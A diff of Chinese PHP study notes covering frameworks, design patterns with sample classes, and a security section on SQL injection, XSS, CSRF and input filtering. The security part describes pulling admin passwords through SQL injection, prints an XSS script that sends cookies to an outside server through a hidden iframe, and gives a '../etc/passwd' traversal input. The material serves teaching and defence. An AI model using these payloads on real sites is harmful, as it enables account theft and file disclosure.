-　　一般来说如果对于小型项目完全没有必要使用框架，框架集成了太多的功能组件，许多无用的功能也带进来，减慢了系统运行的速度。对于水平不高而又需要开发大型PHP项目，使用PHP框架绝对是首选。对于PHP高手，做做项目就形成了自己的框架，按照自己的习惯写的框架，符合自己特定需求，当然速度上更快，何况PHP官方也称PHP可以不依赖框架，也不推荐使用框架。
-```
+
+SpeedPHP是一款全功能的国产PHP应用框架系统。SpeedPHP框架是从实际运行的商业系统中取其精华而成的，在稳定性和运行速度上都非常出色；同时有着清晰的架构，更有利于提高团队开发效率，教程众多，入门容易，号称最适合初学者的PHP框架，快速带你进入PHP高手的行列。
+
+一般来说如果对于小型项目完全没有必要使用框架，框架集成了太多的功能组件，许多无用的功能也带进来，减慢了系统运行的速度。对于水平不高而又需要开发大型PHP项目，使用PHP框架绝对是首选。对于PHP高手，做做项目就形成了自己的框架，按照自己的习惯写的框架，符合自己特定需求，当然速度上更快，何况PHP官方也称PHP可以不依赖框架，也不推荐使用框架。
 
 ### Yaf、Phalcon（C 扩展系）
-```
 https://www.zhihu.com/question/25023032
 
 
-```
-
 ### Swoole、Workerman （网络编程框架）
-```
 https://baijiahao.baidu.com/s?id=1608873823322214852&wfr=spider&for=pc
+
 目前php通信服务框架最流行的有swoole与workerman俩个框架，swoole是有C语言开发的php扩展类，而workerman是纯PHP开发框架，可能swoole比workerman出名，在百度、腾讯公司都有在使用，使用频率也比较高，那么我们来看下php通信服务框架选择swoole还是workerman？
 
-
 swoole是C语言开发的扩展框架，由于有着C语言的优势，swoole在内存管理、数据结构、通信协议解析明显优势于workerman，而且swoole在目前通信协议，提供更高级的通信功能，所以workerman能开发的，swoole都可以，而且功能更多，速度更快，多年的发展稳定性强。swoole也有自己的缺点，不能根据自己需要开发，而且需要PHP程序员了解底层通信服务开发，需要学习的知识比较多，swoole一般适合老手开发。
-
 
 workerman是纯PHP编程语言开发，在需要的时候可以根据需求二次开发，workerman不需要了解太多通信服务，底层框架也不用学习，更不用借助PHP环境开发，可以独立运行，workerman提供完整的通信协议框架，也可以自定义开发协议，所以workerman比较适合新手PHP程序员，workerman资料文档相对来说比swoole多。workerman缺点是需要安装扩展类比较多，在高并发性能，稳定性比不上swoole。
 
 swoole与workerman在一般项目中根本看不出来哪个比较好用，所以不是开发大型类型网站的，新手可以选择workerman提高开发速度，老手选择swoole可以证明自己的实力。
 
 https://www.zhihu.com/question/47994137?sort=created
-```
 
 ## 设计模式
 ### php的设计模式
-```
-1. ###*单例模式**
-一个类在整个应用中，只有一个对象实例的设计模式
-类必须自行创建这个实例
-必须自行向整个系统提供这个实例
-###*三私**：私有静态成员变量、构造函数、克隆函数
-###*一公**：公共的静态方法
+1. 单例模式
 
-2. ###*工厂模式**
+一个类在整个应用中，只有一个对象实例的设计模式
+
+类必须自行创建这个实例
+
+必须自行向整个系统提供这个实例
+
+三私:私有静态成员变量、构造函数、克隆函数
+一公:公共的静态方法
+
+2. 工厂模式
+
 可以根据输入的参数或者应用程序配置的不同,创建一种专门用来实例化并返回其它类的实例的类
 
 3. 观察者模式
+
 观察者模式提供了组件之间紧密耦合的另一种方法。
+
 该模式：一个对象通过添加一个方法（该方法允许另一个对象，即观察者注册自己）全本身变得可观察。
+
 当可观察的对象更改时，它会将消息发送到已注册的观察者。这些观察者使用该信息执行的操作与可观察的对象无关。
 
 4. 命令链模式：
+
 以松散耦合主题为基础，发送消息、命令和请求，或通过一组处理程序发送任意内容。
+
 每个处理程序都会自行判断自己能否处理请求，如果可以，该请求被处理，进程停止。
 
 5. 策略模式：
+
 此算法是从复杂类提取的，因而可以方便地替换。
-```
-```
+
 设计模式
+
 单例模式解决的是如何在整个项目中创建唯一对象实例的问题，工厂模式解决的是如何不通过new建立实例对象的方法。
 
 单例模式
+
 $_instance必须声明为静态的私有变量
+
 构造函数和析构函数必须声明为私有,防止外部程序new 类从而失去单例模式的意义
+
 getInstance()方法必须设置为公有的,必须调用此方法 以返回实例的一个引用
+
 ::操作符只能访问静态变量和静态函数
+
 new对象都会消耗内存
+
 使用场景:最常用的地方是数据库连接。
+
 使用单例模式生成一个对象后， 该对象可以被其它众多对象所使用。
+
 私有的__clone()方法防止克隆对象
+
 单例模式，使某个类的对象仅允许创建一个。构造函数private修饰， 
+
 申明一个static getInstance方法，在该方法里创建该对象的实例。如果该实例已经存在，则不创建。比如只需要创建一个数据库连接。
 
 工厂模式
+
 工厂模式，工厂方法或者类生成对象，而不是在代码中直接new。 
+
 使用工厂模式，可以避免当改变某个类的名字或者方法之后，在调用这个类的所有的代码中都修改它的名字或者参数。
 
-复制代码
- 1 Test1.php
- 2 <?php
- 3 class Test1{
- 4     static function test(){
- 5         echo __FILE__;
- 6     }
- 7 }
- 8 
- 9 Factory.php
-10 <?php
-11 class Factory{
-12     /*
-13      * 如果某个类在很多的文件中都new ClassName()，那么万一这个类的名字
-14      * 发生变更或者参数发生变化，如果不使用工厂模式，就需要修改每一个PHP
-15      * 代码，使用了工厂模式之后，只需要修改工厂类或者方法就可以了。
-16      */
-17     static function createDatabase(){
-18         $test = new Test1();
-19         return $test;
-20     }
-21 }
-22 
-23 Test.php
-24 <?php
-25 spl_autoload_register('autoload1');
-26 
-27 $test = Factory::createDatabase();
-28 $test->test();
-29 function autoload1($class){
-30     $dir  = __DIR__;
-31     $requireFile = $dir."\\".$class.".php";
-32     require $requireFile;
-33 }
-复制代码
+```
+Test1.php
+<?php
+class Test1{
+static function test(){
+echo __FILE__;
+}
+}
 
+Factory.php
+<?php
+class Factory{
+/*
+* 如果某个类在很多的文件中都new ClassName()，那么万一这个类的名字
+* 发生变更或者参数发生变化，如果不使用工厂模式，就需要修改每一个PHP
+* 代码，使用了工厂模式之后，只需要修改工厂类或者方法就可以了。
+*/
+static function createDatabase(){
+$test = new Test1();
+return $test;
+}
+}
+
+Test.php
+<?php
+spl_autoload_register('autoload1');
+
+$test = Factory::createDatabase();
+$test->test();
+function autoload1($class){
+$dir  = __DIR__;
+$requireFile = $dir."\\".$class.".php";
+require $requireFile;
+}
+```
 
 注册模式
+
 注册模式，解决全局共享和交换对象。已经创建好的对象，挂在到某个全局可以使用的数组上，在需要使用的时候，直接从该数组上获取即可。将对象注册到全局的树上。任何地方直接去访问。
-
-复制代码
- 1 <?php
- 2 
- 3 class Register
- 4 {
- 5     protected static  $objects;
- 6     function set($alias,$object)//将对象注册到全局的树上
- 7     {
- 8         self::$objects[$alias]=$object;//将对象放到树上
- 9     }
-10     static function get($name){
-11         return self::$objects[$name];//获取某个注册到树上的对象
-12     }
-13     function _unset($alias)
-14     {
-15         unset(self::$objects[$alias]);//移除某个注册到树上的对象。
-16     }
-17 }
-复制代码
+```
+<?php
+class Register
+{
+protected static  $objects;
+function set($alias,$object)//将对象注册到全局的树上
+{
+self::$objects[$alias]=$object;//将对象放到树上
+}
+static function get($name){
+return self::$objects[$name];//获取某个注册到树上的对象
+}
+function _unset($alias)
+{
+unset(self::$objects[$alias]);//移除某个注册到树上的对象。
+}
+}
+```
 适配器模式
-将各种截然不同的函数接口封装成统一的API。 
-PHP中的数据库操作有MySQL,MySQLi,PDO三种，可以用适配器模式统一成一致，使不同的数据库操作，统一成一样的API。类似的场景还有cache适配器，可以将memcache,redis,file,apc等不同的缓存函数，统一成一致。 
-首先定义一个接口(有几个方法，以及相应的参数)。然后，有几种不同的情况，就写几个类实现该接口。将完成相似功能的函数，统一成一致的方法。
 
-复制代码
-1 接口 IDatabase
-2 <?php
-3 namespace IMooc;
-4 interface IDatabase
-5 {
-6     function connect($host, $user, $passwd, $dbname);
-7     function query($sql);
-8     function close();
-9 }
-复制代码
-复制代码
- 1 MySQL
- 2 <?php
- 3 namespace IMooc\Database;
- 4 use IMooc\IDatabase;
- 5 class MySQL implements IDatabase
- 6 {
- 7     protected $conn;
- 8     function connect($host, $user, $passwd, $dbname)
- 9     {
-10         $conn = mysql_connect($host, $user, $passwd);
-11         mysql_select_db($dbname, $conn);
-12         $this->conn = $conn;
-13     }
-14 
-15     function query($sql)
-16     {
-17         $res = mysql_query($sql, $this->conn);
-18         return $res;
-19     }
-20 
-21     function close()
-22     {
-23         mysql_close($this->conn);
-24     }
-25 }
-复制代码
-复制代码
- 1 MySQLi
- 2 <?php
- 3 namespace IMooc\Database;
- 4 use IMooc\IDatabase;
- 5 class MySQLi implements IDatabase
- 6 {
- 7     protected $conn;
- 8 
- 9     function connect($host, $user, $passwd, $dbname)
-10     {
-11         $conn = mysqli_connect($host, $user, $passwd, $dbname);
-12         $this->conn = $conn;
-13     }
-14 
-15     function query($sql)
-16     {
-17         return mysqli_query($this->conn, $sql);
-18     }
-19 
-20     function close()
-21     {
-22         mysqli_close($this->conn);
-23     }
-24 }
-复制代码
-复制代码
- 1 PDO
- 2 <?php
- 3 namespace IMooc\Database;
- 4 use IMooc\IDatabase;
- 5 class PDO implements IDatabase
- 6 {
- 7     protected $conn;
- 8     function connect($host, $user, $passwd, $dbname)
- 9     {
-10         $conn = new \PDO("mysql:host=$host;dbname=$dbname", $user, $passwd);
-11         $this->conn = $conn;
-12     }
-13 function query($sql)
-14     {
-15         return $this->conn->query($sql);
-16     }
-17 
-18     function close()
-19     {
-20         unset($this->conn);
-21     }
-22 }
-复制代码
+将各种截然不同的函数接口封装成统一的API。 
+
+PHP中的数据库操作有MySQL,MySQLi,PDO三种，可以用适配器模式统一成一致，使不同的数据库操作，统一成一样的API。类似的场景还有cache适配器，可以将memcache,redis,file,apc等不同的缓存函数，统一成一致。 
+
+首先定义一个接口(有几个方法，以及相应的参数)。然后，有几种不同的情况，就写几个类实现该接口。将完成相似功能的函数，统一成一致的方法。
+```
+接口 IDatabase
+<?php
+namespace IMooc;
+interface IDatabase
+{
+function connect($host, $user, $passwd, $dbname);
+function query($sql);
+function close();
+}
+MySQL
+<?php
+namespace IMooc\Database;
+use IMooc\IDatabase;
+class MySQL implements IDatabase
+{
+protected $conn;
+function connect($host, $user, $passwd, $dbname)
+{
+$conn = mysql_connect($host, $user, $passwd);
+mysql_select_db($dbname, $conn);
+$this->conn = $conn;
+}
+
+function query($sql)
+{
+$res = mysql_query($sql, $this->conn);
+return $res;
+}
+
+function close()
+{
+mysql_close($this->conn);
+}
+}
+```
+```
+MySQLi
+<?php
+namespace IMooc\Database;
+use IMooc\IDatabase;
+class MySQLi implements IDatabase
+{
+protected $conn;
+
+function connect($host, $user, $passwd, $dbname)
+{
+$conn = mysqli_connect($host, $user, $passwd, $dbname);
+$this->conn = $conn;
+}
+
+function query($sql)
+{
+return mysqli_query($this->conn, $sql);
+}
+
+function close()
+{
+mysqli_close($this->conn);
+}
+}
+```
+```
+PDO
+<?php
+namespace IMooc\Database;
+use IMooc\IDatabase;
+class PDO implements IDatabase
+{
+protected $conn;
+function connect($host, $user, $passwd, $dbname)
+{
+$conn = new \PDO("mysql:host=$host;dbname=$dbname", $user, $passwd);
+$this->conn = $conn;
+}
+function query($sql)
+{
+return $this->conn->query($sql);
+}
+
+function close()
+{
+unset($this->conn);
+}
+}
+```
 通过以上案例，PHP与MySQL的数据库交互有三套API，在不同的场景下可能使用不同的API，那么开发好的代码，换一个环境，可能就要改变它的数据库API，那么就要改写所有的代码，使用适配器模式之后，就可以使用统一的API去屏蔽底层的API差异带来的环境改变之后需要改写代码的问题。
 
 策略模式
-策略模式，将一组特定的行为和算法封装成类，以适应某些特定的上下文环境。 
-eg：假如有一个电商网站系统，针对男性女性用户要各自跳转到不同的商品类目，并且所有的广告位展示不同的广告。在传统的代码中，都是在系统中加入各种if else的判断，硬编码的方式。如果有一天增加了一种用户，就需要改写代码。使用策略模式，如果新增加一种用户类型，只需要增加一种策略就可以。其他所有的地方只需要使用不同的策略就可以。 
-首先声明策略的接口文件，约定了策略的包含的行为。然后，定义各个具体的策略实现类。
 
-复制代码
- 1 UserStrategy.php
- 2 <?php
- 3 /*
- 4  * 声明策略文件的接口，约定策略包含的行为。
- 5  */
- 6 interface UserStrategy
- 7 {
- 8     function showAd();
- 9     function showCategory();
-10 }
-复制代码
-复制代码
- 1 FemaleUser.php
- 2 <?php
- 3 require_once 'Loader.php';
- 4 class FemaleUser implements UserStrategy
- 5 {
- 6     function showAd(){
- 7         echo "2016冬季女装";
- 8     }
- 9     function showCategory(){
-10         echo "女装";
-11     }
-12 }
-复制代码
-复制代码
- 1 MaleUser.php
- 2 <?php
- 3 require_once 'Loader.php';
- 4 class MaleUser implements UserStrategy
- 5 {
- 6     function showAd(){
- 7         echo "IPhone6s";
- 8     }
- 9     function showCategory(){
-10         echo "电子产品";
-11     }
-12 }
-复制代码
-复制代码
- 1 Page.php//执行文件
- 2 <?php
- 3 require_once 'Loader.php';
- 4 class Page
- 5 {
- 6     protected $strategy;
- 7     function index(){
- 8         echo "AD";
- 9         $this->strategy->showAd();
-10         echo "<br>";
-11         echo "Category";
-12         $this->strategy->showCategory();
-13         echo "<br>";
-14     }
-15     function setStrategy(UserStrategy $strategy){
-16         $this->strategy=$strategy;
-17     }
-18 }
-19 
-20 $page = new Page();
-21 if(isset($_GET['male'])){
-22     $strategy = new MaleUser();
-23 }else {
-24     $strategy = new FemaleUser();
-25 }
-26 $page->setStrategy($strategy);
-27 $page->index();
-复制代码
+策略模式，将一组特定的行为和算法封装成类，以适应某些特定的上下文环境。 
+
+eg：假如有一个电商网站系统，针对男性女性用户要各自跳转到不同的商品类目，并且所有的广告位展示不同的广告。在传统的代码中，都是在系统中加入各种if else的判断，硬编码的方式。如果有一天增加了一种用户，就需要改写代码。使用策略模式，如果新增加一种用户类型，只需要增加一种策略就可以。其他所有的地方只需要使用不同的策略就可以。 
+
+首先声明策略的接口文件，约定了策略的包含的行为。然后，定义各个具体的策略实现类。
+```
+UserStrategy.php
+<?php
+/*
+* 声明策略文件的接口，约定策略包含的行为。
+*/
+interface UserStrategy
+{
+function showAd();
+function showCategory();
+}
+FemaleUser.php
+<?php
+require_once 'Loader.php';
+class FemaleUser implements UserStrategy
+{
+function showAd(){
+echo "2016冬季女装";
+}
+function showCategory(){
+echo "女装";
+}
+}
+
+
+MaleUser.php
+<?php
+require_once 'Loader.php';
+class MaleUser implements UserStrategy
+{
+function showAd(){
+echo "IPhone6s";
+}
+function showCategory(){
+echo "电子产品";
+}
+}
+
+
+Page.php//执行文件
+<?php
+require_once 'Loader.php';
+class Page
+{
+protected $strategy;
+function index(){
+echo "AD";
+$this->strategy->showAd();
+echo "<br>";
+echo "Category";
+$this->strategy->showCategory();
+echo "<br>";
+}
+function setStrategy(UserStrategy $strategy){
+$this->strategy=$strategy;
+}
+}
+
+$page = new Page();
+if(isset($_GET['male'])){
+$strategy = new MaleUser();
+}else {
+$strategy = new FemaleUser();
+}
+$page->setStrategy($strategy);
+$page->index();
+```
 执行结果图： 
 
+总结： 
 
-
-
-
- 总结： 
 通过以上方式，可以发现，在不同用户登录时显示不同的内容，但是解决了在显示时的硬编码的问题。如果要增加一种策略，只需要增加一种策略实现类，然后在入口文件中执行判断，传入这个类即可。实现了解耦。 
+
 实现依赖倒置和控制反转 （有待理解） 
+
 通过接口的方式，使得类和类之间不直接依赖。在使用该类的时候，才动态的传入该接口的一个实现类。如果要替换某个类，只需要提供一个实现了该接口的实现类，通过修改一行代码即可完成替换。
 
 观察者模式
+
 1：观察者模式(Observer)，当一个对象状态发生变化时，依赖它的对象全部会收到通知，并自动更新。 
+
 2：场景:一个事件发生后，要执行一连串更新操作。传统的编程方式，就是在事件的代码之后直接加入处理的逻辑。当更新的逻辑增多之后，代码会变得难以维护。这种方式是耦合的，侵入式的，增加新的逻辑需要修改事件的主体代码。 
+
 3：观察者模式实现了低耦合，非侵入式的通知与更新机制。 
 
-
 定义一个事件触发抽象类。
-
-复制代码
- 1 EventGenerator.php
- 2 <?php
- 3 require_once 'Loader.php';
- 4 abstract class EventGenerator{
- 5     private $observers = array();
- 6     function addObserver(Observer $observer){
- 7         $this->observers[]=$observer;
- 8     }
- 9     function notify(){
-10         foreach ($this->observers as $observer){
-11             $observer->update();
-12         }
-13     }
-14 }
-复制代码
+```
+EventGenerator.php
+<?php
+require_once 'Loader.php';
+abstract class EventGenerator{
+private $observers = array();
+function addObserver(Observer $observer){
+$this->observers[]=$observer;
+}
+function notify(){
+foreach ($this->observers as $observer){
+$observer->update();
+}
+}
+}
+```
 定义一个观察者接口
-
-复制代码
+```
 Observer.php
 <?php
 require_once 'Loader.php';
 interface Observer{
     function update();//这里就是在事件发生后要执行的逻辑
 }
-复制代码
-复制代码
- 1 <?php
- 2 //一个实现了EventGenerator抽象类的类，用于具体定义某个发生的事件
- 3 require 'Loader.php';
- 4 class Event extends EventGenerator{
- 5     function triger(){
- 6         echo "Event<br>";
- 7     }
- 8 }
- 9 class Observer1 implements Observer{
-10     function update(){
-11         echo "逻辑1<br>";
-12     }
-13 }
-14 class Observer2 implements Observer{
-15     function update(){
-16         echo "逻辑2<br>";
-17     }
-18 }
-19 $event = new Event();
-20 $event->addObserver(new Observer1());
-21 $event->addObserver(new Observer2());
-22 $event->triger();
-23 $event->notify();
-复制代码
+```
+```
+<?php
+//一个实现了EventGenerator抽象类的类，用于具体定义某个发生的事件
+require 'Loader.php';
+class Event extends EventGenerator{
+function triger(){
+echo "Event<br>";
+}
+}
+class Observer1 implements Observer{
+function update(){
+echo "逻辑1<br>";
+}
+}
+class Observer2 implements Observer{
+function update(){
+echo "逻辑2<br>";
+}
+}
+$event = new Event();
+$event->addObserver(new Observer1());
+$event->addObserver(new Observer2());
+$event->triger();
+$event->notify();
+```
 当某个事件发生后，需要执行的逻辑增多时，可以以松耦合的方式去增删逻辑。也就是代码中的红色部分，只需要定义一个实现了观察者接口的类，实现复杂的逻辑，然后在红色的部分加上一行代码即可。这样实现了低耦合。
 
 原型模式
-原型模式（对象克隆以避免创建对象时的消耗） 
-1：与工厂模式类似，都是用来创建对象。 
-2：与工厂模式的实现不同，原型模式是先创建好一个原型对象，然后通过clone原型对象来创建新的对象。这样就免去了类创建时重复的初始化操作。 
-3：原型模式适用于大对象的创建，创建一个大对象需要很大的开销，如果每次new就会消耗很大，原型模式仅需要内存拷贝即可。
 
-复制代码
+原型模式（对象克隆以避免创建对象时的消耗） 
+
+1：与工厂模式类似，都是用来创建对象。 
+
+2：与工厂模式的实现不同，原型模式是先创建好一个原型对象，然后通过clone原型对象来创建新的对象。这样就免去了类创建时重复的初始化操作。 
+
+3：原型模式适用于大对象的创建，创建一个大对象需要很大的开销，如果每次new就会消耗很大，原型模式仅需要内存拷贝即可。
+```
 Canvas.php
 <?php
 require_once 'Loader.php';
@@ -17563,37 +17616,37 @@ function rect($x1, $y1, $x2, $y2)
         }
     }
 }
-复制代码
-复制代码
- 1 Index.php
- 2 <?php
- 3 require 'Loader.php';
- 4 $c = new Canvas();
- 5 $c->init();
- 6 / $canvas1 = new Canvas();
- 7 // $canvas1->init();
- 8 $canvas1 = clone $c;//通过克隆，可以省去init()方法，这个方法循环两百次
- 9 //去产生一个数组。当项目中需要产生很多的这样的对象时，就会new很多的对象，那样
-10 //是非常消耗性能的。
-11 $canvas1->rect(2, 2, 8, 8);
-12 $canvas1->draw();
-13 echo "-----------------------------------------<br>";
-14 // $canvas2 = new Canvas();
-15 // $canvas2->init();
-16 $canvas2 = clone $c;
-17 $canvas2->rect(1, 4, 8, 8);
-18 $canvas2->draw();
-复制代码
+Index.php
+<?php
+require 'Loader.php';
+$c = new Canvas();
+$c->init();
+/ $canvas1 = new Canvas();
+// $canvas1->init();
+$canvas1 = clone $c;//通过克隆，可以省去init()方法，这个方法循环两百次
+//去产生一个数组。当项目中需要产生很多的这样的对象时，就会new很多的对象，那样
+//是非常消耗性能的。
+$canvas1->rect(2, 2, 8, 8);
+$canvas1->draw();
+echo "-----------------------------------------<br>";
+// $canvas2 = new Canvas();
+// $canvas2->init();
+$canvas2 = clone $c;
+$canvas2->rect(1, 4, 8, 8);
+$canvas2->draw();
+```
 执行结果：
 
-
-
 装饰器模式
+
 1：装饰器模式，可以动态的添加修改类的功能 
+
 2：一个类提供了一项功能，如果要在修改并添加额外的功能，传统的编程模式，需要写一个子类继承它，并重写实现类的方法 
+
 3：使用装饰器模式，仅需要在运行时添加一个装饰器对象即可实现，可以实现最大额灵活性。
+
 https://www.cnblogs.com/yuanwanli/p/8796402.html
-```
+
 ### 单例模式（重点）
 ```
 ```
@@ -17623,9 +17676,10 @@ https://www.cnblogs.com/yuanwanli/p/8796402.html
 ```
 
 ## 安全篇
+
 ### SQL 注入
+
 ### sql注入获取后台管理员账号密码
-```
 在完全拿下服务器主机之前，存在sql注入漏洞的网站，可能会因此提供给黑客后台管理员的账号密码，黑客登录后台后，上传木马，拿下整个主机。这是sql注入的一种应用场景。
 
 以下讲解sql注入获取后台管理员账号密码的过程，本文以尽力对新手友好的展现过程来讲解基本原理，高手与百事通请避免观看，以免徒耗时间。
@@ -17729,29 +17783,40 @@ ok，已经得到了sy_admin表的所有列名，接下来就可以开始获取s
 上图中加密后的密码可以通过工具或百度在线md5解密工具解密，不作赘述。
 
 同样也可以更换列名查出其他的信息，比如下图所示登录次数27次，上次登录于2月1号。以及其他的东西，你懂的。
-```
+
 ### xss攻击怎么防止
-```
 XSS又称CSS，全称Cross SiteScript(跨站脚本攻击)， XSS攻击类似于SQL注入攻击，
+
 是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。
+
 其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当用户浏览该网站时，
+
 这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie信息、破坏页面结构
+
 常见的恶意字符XSS输入：
+
 1. XSS 输入通常包含 JavaScript 脚本，如弹出恶意警告框：
+
 `<script>alert("XSS");</script>`
+
 2. XSS 输入也可能是 HTML 代码段，譬如：
+
     (1) 网页不停地刷新 `<meta http-equiv="refresh" content="0;">`
+
     (2) 嵌入其它网站的链接，重定向到其它网站等。
+
 方法：利用php htmlentities()函数
+
 php防止XSS跨站脚本攻击的方法：是针对非法的HTML代码包括单双引号等，使用htmlspecialchars()函数。
-```
 
 ### XSS 与 CSRF
-```
+
 用大白话谈谈XSS与CSRF
+
 csrfxssjavascript安全
-发布于 2016-10-01
+
 这两个关键词也是老生常谈了，但是还总是容易让人忘记与搞混~。
+
 XSS与CSRF这两个关键词时常被拉出来一起比较（尤其是面试），我在这里也在写一篇扫盲文，也帮自己整理一下知识脉络。
 
 这篇文章会用尽量“人话”的语言解释这二个关键词，让同学们对跨域，安全有更深一层次的了解。
@@ -17773,6 +17838,7 @@ CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）
 XSS更偏向于方法论，CSRF更偏向于一种形式，只要是伪造用户发起的请求，都可成为CSRF攻击。
 
 通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。
+
 XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。
 
 简单来说，条条大路（XSS路，命令行路）通罗马（CSRF马，XSRF马）。
@@ -17794,7 +17860,6 @@ while(true){
 
 那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：
 
-
 // 用 <script type="text/javascript"></script> 包起来放在评论中
 (function(window, document) {
     // 构造泄露信息用的 URL
@@ -17810,6 +17875,7 @@ while(true){
     // 开工
     document.body.appendChild(hideFrame);
 })(window, document);
+
 此段代码携带着cookie信息传输给了 http://192.168.123.123/myxss/... 这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php 中写一些可怕的代码，如把用户信息存进自己的数据库）。
 
 有没感觉到背后一寒
@@ -17820,6 +17886,7 @@ while(true){
 这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。
 
 那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：
+
 一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com/bbs/delete_article.php?id=“X" 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com/bbs/delete_article.php?id=“X" ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！
 
 XSS与CSRF讲完了，回头我会讲下如何防范XSS与CSRF。
@@ -17829,24 +17896,20 @@ XSS与CSRF讲完了，回头我会讲下如何防范XSS与CSRF。
 参考文章：
 https://segmentfault.com/a/11... 《 总结 XSS 与 CSRF 两种跨站攻击 》
 http://www.lxway.com/48228121... 《CSRF CORS》
-```
 
 ### 输入过滤
-```
 
 过滤输入
-过滤是Web应用安全的基础。它是你验证数据合法性的过程。通过在输入时确认对所有的数据进行过滤，你可以避免被污染（未过滤）数据在你的程序中被误信及误用。大多数流行的PHP应用的漏洞最终都是因为没有对输入进行恰当过滤造成的。
 
+过滤是Web应用安全的基础。它是你验证数据合法性的过程。通过在输入时确认对所有的数据进行过滤，你可以避免被污染（未过滤）数据在你的程序中被误信及误用。大多数流行的PHP应用的漏洞最终都是因为没有对输入进行恰当过滤造成的。
 
 我所指的过滤输入是指三个不同的步骤：
 
+识别输入
 
-l 识别输入
+过滤输入
 
-l 过滤输入
-
-l 区分已过滤及被污染数据
-
+区分已过滤及被污染数据
 
 把识别输入做为第一步是因为如果你不知道它是什么，你也就不能正确地过滤它。输入是指所有源自外部的数据。例如，所有发自客户端的是输入，但客户端并不是唯一的外部数据源，其它如数据库和RSS推送等也是外部数据源。
 
@@ -17859,73 +17922,19 @@ l 区分已过滤及被污染数据
 一旦识别了输入，你就可以过滤它了。过滤是一个有点正式的术语，它在平时表述中有很多同义词，如验证、清洁及净化。尽管这些大家平时所用的术语稍有不同，但它们都是指的同一个处理：防止非法数据进入你的应用。
 
 有很多种方法过滤数据，其中有一些安全性较高。最好的方法是把过滤看成是一个检查的过程。请不要试图好心地去纠正非法数据，要让你的用户按你的规则去做，历史证明了试图纠正非法数据往往会导致安全漏洞。例如，考虑一下下面的试图防止目录跨越的方法（访问上层目录）。
-
-
-CODE:
-
-
-1
-
-2
-
-3
-
-4
-
-5
-
-6
-
-
-  
-
-  $filename = str_replace('..', '.',
-
+```
+$filename = str_replace('..', '.',
 $_POST['filename']);
-
-  
-
-  ?>
-
-
-
-
+?>
+```
 你能想到$_POST['filename']如何取值以使$filename成为Linux系统中用户口令文件的路径../../etc/passwd吗？
-
 
 答案很简单：
 
-1
-
 .../.../etc/passwd
 
-
-
 这个特定的错误可以通过反复替换直至找不到为止：
-
-
-CODE:
-
-
-1
-
-2
-
-3
-
-4
-
-5
-
-6
-
-7
-
-8
-
-9
-
-  
+```
   $filename = $_POST['filename'];
 
   while (strpos($_POST['filename'], '..') !=  =
@@ -17941,12 +17950,9 @@ $filename);
   }
 
   ?>
-
-
-
+```
 
 当然，函数basename( )可以替代上面的所有逻辑，同时也能更安全地达到目的。不过重要点是在于任何试图纠正非法数据的举动都可能导致潜在错误并允许非法数据通过。只做检查是一个更安全的选择。
-
 
 译注：这一点深有体会，在实际项目曾经遇到过这样一件事，是对一个用户注册和登录系统进行更改，客户希望用户名前后有空格就不能登录，结果修改时对用户登录程序进行了更改，用trim（）函数把输入的用户名前后的空格去掉了（典型的好心办坏事），但是在注册时居然还是允许前后有空格！结果可想而知。
 
@@ -17954,170 +17960,48 @@ $filename);
 
 如果你能正确可靠地识别和过滤输入，你的工作就基本完成了。最后一步是使用一个命名约定或其它可以帮助你正确和可靠地区分已过滤和被污染数据的方法。我推荐一个比较简单的命名约定，因为它可以同时用在面向过程和面向对象的编程中。我用的命名约定是把所有经过滤的数据放入一个叫$clean的数据中。你需要用两个重要的步骤来防止被污染数据的注入：
 
+经常初始化$clean为一个空数组。
 
-l 经常初始化$clean为一个空数组。
-
-l 加入检查及阻止来自外部数据源的变量命名为clean，
-
+加入检查及阻止来自外部数据源的变量命名为clean，
 
 实际上，只有初始化是至关紧要的，但是养成这样一个习惯也是很好的：把所有命名为clean的变量认为是你的已过滤数据数组。这一步骤合理地保证了$clean中只包括你有意保存进去的数据，你所要负责的只是不在$clean存在被污染数据。
 
-
 为了巩固这些概念，考虑下面的表单，它允许用户选择三种颜色中的一种；
-
-CODE:
-
-
-1
-
-2
-
-3
-
-4
-
-5
-
-6
-
-7
-
-8
-
-9
-
-10
-
-11
-
-
-
-  Please select a color:
-
-  
-
-  
-
-  
-
-
-
-
-
+```
+Please select a color:
+```
 在处理这个表单的编程逻辑中，非常容易犯的错误是认为只能提交三个选择中的一个。在第二章中你将学到，客户端能提交任何数据作为$_POST['color']的值。为了正确地过滤数据，你需要用一个switch语句来进行：
-
-CODE:
-
-
-1
-
-2
-
-3
-
-4
-
-5
-
-6
-
-7
-
-8
-
-9
-
-10
-
-11
-
-12
-
-13
-
-
- 
-
+```
 $clean = array(  );
-
 switch($_POST['color'])
-
 {
-
   case 'red':
-
   case 'green':
-
   case 'blue':
-
     $clean['color'] = $_POST['color'];
-
     break;
-
 }
-
- 
-
 ?>
-
-
-
+```
